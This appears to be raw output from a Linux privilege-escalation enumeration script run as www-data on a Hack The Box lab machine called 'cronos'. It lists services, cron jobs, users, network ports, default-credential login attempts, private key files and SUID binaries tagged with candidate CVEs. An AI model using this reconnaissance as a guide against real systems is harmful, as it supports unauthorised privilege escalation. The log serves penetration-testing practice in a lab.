-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root root    18504 Feb  3  2017 /usr/bin/lxcfs
-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m                                                                            
-rwxr-xr-x 1 root root    15048 Jan 18  2016 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 18977392 Feb 24  2017 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    48112 Apr  9  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root   646080 Jul 15  2016 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Jan 15  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  6  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root 24741672 Feb  6  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   639672 Feb 15  2017 /usr/sbin/named
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   799216 Aug 11  2016 /usr/sbin/sshd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information                                                                
                                                                                  

COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                     
gdm-password Not Found                                                            
gnome-keyring-daemon Not Found                                                    
lightdm Not Found                                                                 
vsftpd Not Found                                                                  
apache2 process found (dump creds from memory as root)                            
sshd Not Found
                                                                                  
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                  
incrontab Not Found
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab                             

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

[+] Services
[i] Search for outdated versions                                                  
 [ + ]  acpid                                                                     
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ + ]  bind9
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ + ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  mysql
 [ + ]  networking
 [ + ]  ondemand
 [ + ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ + ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  urandom
 [ - ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                 

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services          
/lib/systemd/system/emergency.service is executing some relative path             
/lib/systemd/system/networking.service is executing some relative path
/lib/systemd/system/rescue.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
NEXT                          LEFT          LAST                          PASSED       UNIT                         ACTIVATES
Fri 2023-05-05 12:05:39 EEST  56min left    Fri 2023-05-05 07:44:14 EEST  3h 24min ago snapd.refresh.timer          snapd.refresh.service
Fri 2023-05-05 16:45:36 EEST  5h 36min left Fri 2023-05-05 04:50:55 EEST  6h ago       apt-daily.timer              apt-daily.service
Sat 2023-05-06 05:06:00 EEST  17h left      Fri 2023-05-05 05:06:00 EEST  6h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                           n/a           n/a                           n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
                                                                                  
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  
:1.1                                 952 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.171                             25101 busctl          www-data         :1.171        apache2.service           -          -                  
:1.2                                 942 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
:1.3                                1016 polkitd         root             :1.3          polkitd.service           -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts             942 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus                 964 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                               
org.freedesktop.PolicyKit1          1016 polkitd         root             :1.3          polkitd.service           -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               952 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


═══════════════════════════════════╣ Network Information ╠════════════════════════════════════                                                                      
[+] Hostname, hosts and DNS                                                       
cronos                                                                            
127.0.0.1       localhost
127.0.1.1       cronos.hackthebox.gr    cronos

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8
hackthebox.gr

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                         
                                                                                  
[+] Interfaces
# symbolic names for networks, see networks(5) for more information               
link-local 169.254.0.0
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:f5:d0  
          inet addr:10.129.227.211  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:feb9:f5d0/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:f5d0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1034325 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1030718 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:148011005 (148.0 MB)  TX bytes:435868863 (435.8 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:547 errors:0 dropped:0 overruns:0 frame:0
          TX packets:547 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:48038 (48.0 KB)  TX bytes:48038 (48.0 KB)


[+] Networks and neighbours
Kernel IP routing table                                                           
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.129.0.1      0.0.0.0         UG    0      0        0 ens160
10.129.0.0      *               255.255.0.0     U     0      0        0 ens160


Address                  HWtype  HWaddress           Flags Mask            Iface
10.129.0.1               ether   00:50:56:b9:ac:f1   C                     ens160

[+] Iptables rules
iptables rules Not Found                                                          
                                                                                  
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 10.129.227.211:53       0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

[+] Can I sniff with tcpdump?
No                                                                                
                                                                                  

════════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                       
[+] My user                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users             
uid=33(www-data) gid=33(www-data) groups=33(www-data)                             

[+] Do I have PGP keys?
/usr/bin/gpg                                                                      
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                          
                                                                                  
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
                                                                                  
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                 
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                             
gdb wasn't found in PATH

[+] Checking doas.conf
/etc/doas.conf Not Found                                                          
                                                                                  
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                             
                                                                                  
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                   

[+] Users with console
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash                      
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                            
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(noulis) gid=1000(noulis) groups=1000(noulis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(mysql) gid=111(mysql) groups=111(mysql)
uid=108(messagebus) gid=112(messagebus) groups=112(messagebus)
uid=109(uuidd) gid=113(uuidd) groups=113(uuidd)
uid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(bind) gid=119(bind) groups=119(bind)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 11:09:32 up  6:18,  0 users,  load average: 0.17, 0.11, 0.04                     
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
                                                                                  
wtmp begins Fri May  5 06:25:02 2023

[+] Last time logon each user
Username         Port     From             Latest                                 
root             tty1                      Fri Jun 17 16:02:44 +0300 2022
noulis           pts/0    10.10.14.141     Thu Jul 27 01:39:12 +0300 2017

[+] Password policy
PASS_MAX_DAYS   99999                                                             
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                   
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                   
                                                                                  

═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════                                                                      
[+] MySQL version                                                                 
mysql  Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using  EditLine wrapper       

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                       
[+] MySQL connection using root/NOPASS ................. No                       
[+] Searching mysql credentials and exec                                          
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql   
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                        
                                                                                  
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No          
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No          
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No          
                                                                                  
[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)                                   
Server built:   2016-07-14T12:32:26
/etc/apache2/sites-enabled/admin.conf:ServerName admin.cronos.htb
/etc/apache2/sites-enabled/laravel.conf:ServerName cronos.htb
/etc/apache2/sites-enabled/laravel.conf:ServerAlias www.cronos.htb
PHP exec extensions
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found                                                                        
                                                                                  
[+] Searching Wordpress wp-config.php files
wp-config.php Not Found                                                           
                                                                                  
[+] Searching Drupal settings.php files
/default/settings.php Not Found                                                   
                                                                                  
[+] Searching Moodle config.php files
config.php inside a moodle folder Not Found                                       
                                                                                  
[+] Searching Tomcat users file
tomcat-users.xml Not Found                                                        
                                                                                  
[+] Mongo information
mongo binary Not Found                                                            
                                                                                  
[+] Searching supervisord configuration file
supervisord.conf Not Found                                                        
                                                                                  
[+] Searching cesi configuration file
cesi.conf Not Found                                                               
                                                                                  
[+] Searching Rsyncd config file
rsyncd.conf Not Found                                                             
[+] Searching Hostapd config file                                                 
hostapd.conf Not Found                                                            
                                                                                  
[+] Searching wifi conns file
 Not Found                                                                        
                                                                                  
[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found                                                         
                                                                                  
[+] Searching .vnc directories and their passwd files
.vnc Not Found                                                                    
                                                                                  
[+] Searching ldap directories and their hashes
/etc/ldap                                                                         
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found                                                                   
                                                                                  
[+] Searching ssl/ssh files
Port 22                                                                           
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.key                                                                               
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.key
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/dkim/dkim.test.priv
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                
                                                                                  
[+] Searching Cloud credentials (AWS, Azure, GC)
                                                                                  
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                              
/etc/exports Not Found                                                            
                                                                                  
[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                               
tickets kerberos Not Found                                                        
klist Not Found                                                                   
                                                                                  
[+] Searching Kibana yaml
kibana.yml Not Found                                                              
                                                                                  
[+] Searching Knock configuration
Knock.config Not Found                                                            
                                                                                  
[+] Searching logstash files
 Not Found                                                                        
                                                                                  
[+] Searching elasticsearch files
 Not Found                                                                        
                                                                                  
[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                    
                                                                                  
[+] Searching AD cached hashes
cached hashes Not Found                                                           
                                                                                  
[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
No Sockets found in /var/run/screen/S-www-data.                                   

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
tmux Not Found                                                                    
                                                                                  
[+] Searching Couchdb directory
                                                                                  
[+] Searching redis.conf
                                                                                  
[+] Searching dovecot files
dovecot credentials Not Found                                                     
                                                                                  
[+] Searching mosquitto.conf
                                                                                  
[+] Searching neo4j auth file
                                                                                  
[+] Searching Cloud-Init conf file
                                                                                  
[+] Searching Erlang cookie file
                                                                                  
[+] Searching GVM auth file
                                                                                  
[+] Searching IPSEC files
                                                                                  
[+] Searching IRSSI files
                                                                                  
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings                                               
/usr/share/keyrings:
total 24
-rw-r--r-- 1 root root 12335 May 19  2012 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root     0 May 19  2012 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root     0 Nov 11  2013 ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root  2294 Nov 11  2013 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root  1227 May 19  2012 ubuntu-master-keyring.gpg
Keyring folder: /var/lib/apt/keyrings
/var/lib/apt/keyrings:
total 16
-rw-r--r-- 1 root root 12335 Feb 15  2017 ubuntu-archive-keyring.gpg

[+] Searching Filezilla sites file
                                                                                  
[+] Searching backup-manager files
                                                                                  
[+] Searching uncommon passwd files (splunk)
                                                                                  
[+] Searching GitLab related files
                                                                                  

[+] Searching PGP/GPG
PGP/GPG software:                                                                 
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Searching vim files
                                                                                  
[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                                 
                                                                                  
[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                           
                                                                                  
[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                              
                                                                                  
[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Autologin Files
                                                                                  


[+] S/Key authentication
                                                                                  
[+] YubiKey authentication
                                                                                  
[+] Passwords inside pam.d
                                                                                  
[+] FastCGI Params
                                                                                  

[+] SNMPs
                                                                                  


════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                       
[+] SUID - Check easy privesc, exploits and write perms                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
strings Not Found                                                                 
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6                       
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-sr-x 1 daemon daemon      51K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                 
-rwsr-xr-x 1 root   root        15K Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1                                                                         
-rwsr-xr-x 1 root   root        23K Jan 18  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                   
-rwsr-xr-x 1 root   root        53K Mar 29  2016 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)     
-rwsr-xr-x 1 root   root        74K Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        40K Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root   root        49K Mar 29  2016 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root        39K Mar 29  2016 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                 
-rwsr-xr-x 1 root   root        40K Mar 29  2016 /bin/su
-rwsr-xr-x 1 root   root        33K Mar 29  2016 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        33K Mar 29  2016 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root       419K Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        27K Dec 16  2016 /bin/umount  --->  BSD/Linux(08-1996)                                                                              
-rwsr-xr-x 1 root   root        40K Dec 16  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                    
-rwsr-xr-- 1 root   messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                        
-rwsr-xr-x 1 root   root       134K Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root   root       139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                       
-rwsr-xr-x 1 root   root        56K Feb 24  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        39K Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                         
-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
-rwxr-sr-x 1 root   mlocate  39K Nov 18  2014 /usr/bin/mlocate                    
-rwsr-sr-x 1 daemon daemon   51K Jan 15  2016 /usr/bin/at
-rwxr-sr-x 1 root   utmp    425K Feb  7  2016 /usr/bin/screen
-rwxr-sr-x 1 root   tty      15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root   utmp     10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter                                                                           
-rwxr-sr-x 1 root   shadow   35K Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   shadow   23K Mar 29  2016 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow   61K Mar 29  2016 /usr/bin/chage
-rwxr-sr-x 1 root   crontab  36K Apr  6  2016 /usr/bin/crontab
-rwxr-sr-x 1 root   ssh     351K Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   tty      27K Dec 16  2016 /usr/bin/wall

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so             
/etc/ld.so.conf                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
Current capabilities:                                                             
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
/etc/security/capability.conf Not Found                                           
                                                                                  
[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls              
files with acls in searched folders Not Found                                     
                                                                                  
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                             
/usr/bin/gettext.sh                                                               

[+] Unexpected in root
/vmlinuz                                                                          
/initrd.img.old
/initrd.img
/vmlinuz.old
/lost+found

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files    
total 24                                                                          
drwxr-xr-x  2 root root 4096 May 10  2022 .
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rw-r--r--  1 root root  101 Jan 14  2017 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

